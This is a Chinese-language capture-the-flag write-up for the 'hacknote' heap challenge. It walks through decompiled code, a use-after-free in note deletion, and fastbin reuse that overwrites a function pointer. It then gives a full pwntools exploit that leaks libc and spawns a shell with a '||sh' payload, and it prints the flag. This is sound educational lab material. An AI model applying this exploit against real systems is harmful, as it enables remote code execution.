# hacknote

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=d4d440f9-1905-400d-b07a-df8a334d92f6_2)

这题看了很久了，结局也是毫不意外——没懂。

这次的checksec帮助较小，就不放了，直接main。

```c
void Main(void)
{
  int iVar1;
  int in_GS_OFFSET;
  char local_18 [4];
  undefined4 local_14;
  undefined *puStack12;
  puStack12 = &stack0x00000004;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  do {
    while( true ) {
      while( true ) {
        PrintMenu();
        read(0,local_18,4);
        iVar1 = atoi(local_18);
        if (iVar1 != 2) break;
        DeleteNote();
      }
      if (2 < iVar1) break;
      if (iVar1 == 1) {
        AddNote();
      }
      else {
LAB_08048a96:
        puts("Invalid choice");
      }
    }
    if (iVar1 != 3) {
      if (iVar1 == 4) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      goto LAB_08048a96;
    }
    PrintNote();
  } while( true );
}
```

还是能看出来是个菜单的，就是顺序有点乱。按顺序先看AddNote。

```c
void AddNote(void)
{
  int iVar1;
  void *pvVar2;
  size_t __size;
  int in_GS_OFFSET;
  int i;
  char local_18 [8];
  int local_10;
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  if (DAT_0804a04c < 6) {
    for (i = 0; i < 5; i = i + 1) {
      if (*(int *)(&DAT_0804a050 + i * 4) == 0) {
        pvVar2 = malloc(8);
        *(void **)(&DAT_0804a050 + i * 4) = pvVar2;
        if (*(int *)(&DAT_0804a050 + i * 4) == 0) {
          puts("Alloca Error");
                    /* WARNING: Subroutine does not return */
          exit(-1);
        }
        **(code ***)(&DAT_0804a050 + i * 4) = FUN_0804862b;
        printf("Note size :");
        read(0,local_18,8);
        __size = atoi(local_18);
        iVar1 = *(int *)(&DAT_0804a050 + i * 4);
        pvVar2 = malloc(__size);
        *(void **)(iVar1 + 4) = pvVar2;
        if (*(int *)(*(int *)(&DAT_0804a050 + i * 4) + 4) == 0) {
          puts("Alloca Error");
                    /* WARNING: Subroutine does not return */
          exit(-1);
        }
        printf("Content :");
        read(0,*(void **)(*(int *)(&DAT_0804a050 + i * 4) + 4),__size);
        puts("Success !");
        DAT_0804a04c = DAT_0804a04c + 1;
        break;
      }
    }
  }
  else {
    puts("Full");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

看到这我直接懵逼。能看出来malloc了两次，但不知道为啥要这么干。看了[wp](https://blog.csdn.net/seaaseesa/article/details/102988232)才知道是个结构体，一个Note内部有函数指针和内容指针，正好是第一次malloc的长度8字节；第二次malloc是给要输入的内容开辟空间。

然后看DeleteNote。

```c
void DeleteNote(void)
{
  int iVar1;
  int in_GS_OFFSET;
  char local_14 [4];
  int local_10;
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Index :");
  read(0,local_14,4);
  iVar1 = atoi(local_14);
  if ((iVar1 < 0) || (DAT_0804a04c <= iVar1)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(int *)(&DAT_0804a050 + iVar1 * 4) != 0) {
    free(*(void **)(*(int *)(&DAT_0804a050 + iVar1 * 4) + 4));
    free(*(void **)(&DAT_0804a050 + iVar1 * 4));
    puts("Success");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

malloc+free不置null明显UAF。我自己做的时候能想到这个漏洞，但是不知道怎么利用。最后再看个PrintNote。

```c
void PrintNote(void)
{
  int iVar1;
  int in_GS_OFFSET;
  char local_14 [4];
  int local_10;
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Index :");
  read(0,local_14,4);
  iVar1 = atoi(local_14);
  if ((iVar1 < 0) || (DAT_0804a04c <= iVar1)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(int *)(&DAT_0804a050 + iVar1 * 4) != 0) {
    (***(code ***)(&DAT_0804a050 + iVar1 * 4))(*(undefined4 *)(&DAT_0804a050 + iVar1 * 4));
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

打印笔记内容的实质是(\*\*\*(code \*\*\*)(&DAT_0804a050 + iVar1 \* 4))(\*(undefined4 \*)(&DAT_0804a050 + iVar1 \* 4))，有点抽象但是能感觉到是调用了什么函数。结合刚刚提到的结构体中的函数指针可以猜测是调用了那个函数。事实确实如此，回头看赋值的函数FUN_0804862b。

```c
void FUN_0804862b(int param_1)
{
  puts(*(char **)(param_1 + 4));
  return;
}
```

就是puts。后续exp直接用这个函数来泄露地址。puts多没意思，有没有办法可以把这个函数指针改成别的？正常来说是不行的，因为每个note创建时函数指针都是puts，而且我们无法修改当前笔记的指针。所以为什么一定要修改当前笔记的呢？别忘了UAF的强大。

首先申请note1，内容大小不要填0x8，因为这正好也是笔记结构体的大小，delete之后会打乱我们对堆块的控制。内容随意填，可以看出来笔记的内容不重要，重要的只有那个函数指针。然后再来一个note2，条件和note1一样。最后删除note1，删除note2。只关注函数指针，两个笔记都有0x8大小的内存被free，note1先free，note2后free。因为fastbin后进先出的特点，如果这个时候再malloc一个0x8大小的内存，得到的就是指向note2结构体的指针。

于是我们再创建一个笔记note3，大小为0x8。首先系统会给note结构体malloc 0x8的大小，得到了指向note2结构体的指针。这块不重要，重点是当程序再次给内容申请内存时，由于大小也是0x8，那这次就得到了指向note1结构体的指针。现在我们就能随意控制函数指针了，只不过不是note3的，是note1的。执行被更改的函数指针也很简单，在PrintNote那里打印note1，也就是索引为0。第一次我们需要把puts的加载地址打印出来，计算libc中的偏移。

计算完成后重复以上步骤。删除note3，创建note4，大小还是0x8。由于DeleteNote中先释放的内容指针再释放的函数指针，因此创建笔记时，note4函数指针是note3的函数指针也是note2的结构体指针，note4的内容指针就是note3的内容指针也就是note1的函数指针。一样的情况再次被我们利用到。这个时候就可以直接上system了。先把exp放出来。

```python
from pwn import *
p=remote('61.147.171.105',60798)
def Add(size,content):
    p.sendlineafter('Your choice :','1')
    p.sendlineafter('Note size :',str(size))
    p.sendlineafter('Content :',content)
def Print(index):
    p.sendlineafter('Your choice :','3')
    p.sendlineafter('Index :',str(index))
def Del(index):
    p.sendlineafter('Your choice :','2')
    p.sendlineafter('Index :',str(index))
Add(0x20,'aaaa')
Add(0x20,'bbbb')
Del(0)
Del(1)
puts_got=134520868
FUN_0804862b=0x0804862B
Add(0x8,p32(FUN_0804862b)+p32(puts_got))
Print(0)
puts_addr=u32(p.recv(4))
system_addr=puts_addr-0x24800
Del(2)
payload=p32(system_addr)+b'||sh'
Add(0x8,payload)
Print(0)
p.interactive()
```

||sh是因为传入system的参数是一整个结构体，也就是p32(system_addr)+b'||sh'。p32(system_addr)这个东西肯定无法执行，||就是在前一个命令无法执行的情况下执行的命令。这是shell基础，不难。之前泄露puts正常的原因是我们使用的是FUN_0804862b，这个函数本身就只会将传入的参数从第4位开始作为参数，故成功执行。

- ### Flag
  > cyberpeace{0977c7973dc138ca1639a8fb8741d7ba}